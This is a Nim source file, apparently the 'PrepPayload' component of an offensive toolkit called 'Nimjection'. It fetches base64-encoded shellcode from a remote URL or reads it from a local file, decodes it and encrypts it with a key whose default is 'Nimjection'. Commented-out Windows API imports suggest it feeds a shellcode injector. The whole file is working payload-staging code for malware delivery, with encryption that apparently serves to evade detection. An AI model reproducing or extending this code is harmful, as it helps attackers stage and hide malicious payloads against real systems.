import httprequest
import base64
#import winim/lean
#import osproc
import encrypt
import parseopt
import os
import sequtils


let argv = commandLineParams()

var
    b64Payload = ""
    shellcode: seq[byte]
    enkey = ""

if argv == @[]:
  echo "Flags:\n--url\n--file\n--enkey\tencryption key, DEAFULT: Nimjection\n\nUsage:\n./PrepPayload  --url:http://127.0.0.1/shellcode\tGet Remote Payload\n./PrepPayload --file:\"Local Payload File\"\tGet Local Payload"
else:

  let f = toSeq(getopt())
  
  for a in f:
    if a.key == "url":
        echo "Grabbing payload from: " & a.val

        if f[f.high].key == "enkey":
            enkey = f[f.high].val
        else:
            enkey = "Nimjection"


        b64Payload = httpRequest(a.val)
        shellcode = toByteSeq(decode(b64Payload))
        echo "Encrypting Payload..."
        encrypt(shellcode, enkey)
        
        break

    elif a.key == "file":

        echo "Grabbing payload from: " & a.val

        if f[f.high].key == "enkey":
            enkey = f[f.high].val
        else:
            enkey = "Nimjection"

        b64Payload = readFile(a.val)
        shellcode = toByteSeq(decode(b64Payload))
        echo "Encrypting Payload..."
        encrypt(shellcode,enkey)
        
        break
    else:
        echo "unknown command line argument: " & a.key
        break







